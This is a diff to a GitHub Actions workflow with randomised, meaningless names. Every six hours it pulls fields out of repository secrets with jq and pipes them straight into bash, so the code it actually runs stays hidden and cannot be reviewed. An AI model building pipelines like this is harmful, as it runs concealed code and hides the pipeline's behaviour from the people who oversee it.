@@ -1,25 +1,25 @@
 name: yidongping8761
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '14 0/6 * * *'
+    - cron: '15 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: yidongping8761
         env:
-          ltjt3693: ${{ secrets.ltjt3693 }}
+          gfhd855: ${{ secrets.gfhd855 }}
         run: |
-          echo $ltjt3693 | jq -r .jpa302 | /bin/bash
-          echo $yshl15 | jq -r .bs61 | /bin/bash
-          echo $lu9709 | jq -r .vles4598 | /bin/bash
-          echo $psh3535 | jq -r .h7 | /bin/bash
-          echo $ri195 | jq -r .tri51 | /bin/bash
-          echo $wtuts6 | jq -r .p468 | /bin/bash
-          echo $l80675 | jq -r .lsq0600 | /bin/bash
-          echo $y60068 | jq -r .cfwbv05 | /bin/bash
-          echo $okoem09 | jq -r .lcrg04 | /bin/bash
-          echo $avc92581 | jq -r .yuqb01 | /bin/bash
+          echo $gfhd855 | jq -r .xdi0214 | /bin/bash
+          echo $e60 | jq -r .a1389 | /bin/bash
+          echo $cagzt2722 | jq -r .wt9 | /bin/bash
+          echo $kbm436 | jq -r .ppj17517 | /bin/bash
+          echo $le1 | jq -r .w1569 | /bin/bash
+          echo $nmx95151 | jq -r .mqavf3766 | /bin/bash
+          echo $rzv1337 | jq -r .rsnhl24 | /bin/bash
+          echo $gl5 | jq -r .f13884 | /bin/bash
 
